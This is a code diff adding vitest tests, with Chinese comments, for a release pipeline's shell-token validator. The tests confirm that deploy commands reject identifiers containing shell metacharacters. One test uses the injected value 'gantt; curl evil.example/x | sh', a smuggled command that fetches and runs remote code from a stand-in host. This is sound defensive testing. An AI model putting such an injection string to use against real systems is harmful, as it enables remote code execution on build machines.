@@ -7,7 +7,7 @@
  * 部署证据的 `deployedCommit` 必须等于集成提交。
  */
 import { describe, expect, it } from 'vitest';
-import { createReleasePipeline } from '../executor/release-pipeline.js';
+import { assertShellSafeToken, createReleasePipeline } from '../executor/release-pipeline.js';
 
 const BASE = 'a'.repeat(40);
 const CHANGE = 'b'.repeat(40);
@@ -416,5 +416,66 @@ describe('[SCN-FWB-035] Release 租约凭证随每条事件上报（评审 §3.2
             .catch((e) => e);
         expect(error.code).toBe('FEEDBACK_EXECUTOR_LEASE_STALE');
         expect(git.calls.some((call) => call.startsWith('push'))).toBe(false);
+    });
+});
+
+/**
+ * [SCN-FWB-035] 拼进 shell 的标识符必须先过字符集（代码评审 2026-09-02 §1.7）。
+ *
+ * 部署命令是 `shell: true` 下的字符串拼接，`pagesProject`/`baseRef`/`integrationCommit`
+ * 全部来自控制面数据。「控制面受信」是一层假设而不是一道防线——Worker 被攻破或 D1
+ * 被注入的那一刻，它等价于开发机上的任意命令执行。
+ */
+describe('[SCN-FWB-035] 部署命令的字符集闸', () => {
+    it('pagesProject 带命令分隔符时拒绝构造命令，且绝不执行部署', async () => {
+        const commands = [];
+        const events = [];
+        const git = fakeGit();
+        const pipeline = createReleasePipeline({
+            workspaceDir: 'C:/ws',
+            childEnv: { PATH: 'p' },
+            log: () => {},
+            gitFactory: () => git,
+            runVerification: async () => ({
+                passed: true,
+                report: {
+                    targetedTests: { command: 'npm test', required: true, passed: true },
+                    build: { command: 'npm run build', required: true, passed: true },
+                    playwright: { command: 'npm run test:e2e', required: false, passed: true },
+                },
+            }),
+            runCommandImpl: async ({ command }) => {
+                commands.push(command);
+                return { ok: true, exitCode: 0, timedOut: false, output: '' };
+            },
+            fsImpl: { existsSync: () => true },
+            fetchImpl: async () => ({ status: 200 }),
+        });
+        const controlPlane = {
+            async postReleaseEvent({ event }) {
+                events.push({ type: event.type, payload: event.payload });
+                return { duplicate: false };
+            },
+        };
+
+        const claim = {
+            ...claimFor({ deploymentRequired: true, deploymentTarget: 'pages' }),
+            deployConfig: { pagesProject: 'gantt; curl evil.example/x | sh' },
+        };
+        const result = await pipeline.deliver({ claim, controlPlane });
+
+        expect(result).toMatchObject({ outcome: 'failed', errorCode: 'blocked_external' });
+        // 坏行为下这里会有一条把注入串原样拼进去的 wrangler 命令。
+        expect(commands.some((command) => command.includes('curl evil.example'))).toBe(false);
+        expect(events.at(-1).payload.summary).toContain('deployConfig.pagesProject');
+    });
+
+    it('正常的项目名与提交号照常通过', () => {
+        expect(assertShellSafeToken('pagesProject', 'gantt-task-editor')).toBe('gantt-task-editor');
+        expect(assertShellSafeToken('integrationCommit', 'a'.repeat(40))).toBe('a'.repeat(40));
+        expect(assertShellSafeToken('baseRef', 'release/2026-09')).toBe('release/2026-09');
+        for (const bad of ['a b', 'a;b', 'a`b`', 'a$(b)', 'a|b', 'a&b', '', '  ']) {
+            expect(() => assertShellSafeToken('x', bad)).toThrow('EXECUTOR_UNSAFE_SHELL_TOKEN');
+        }
     });
 });
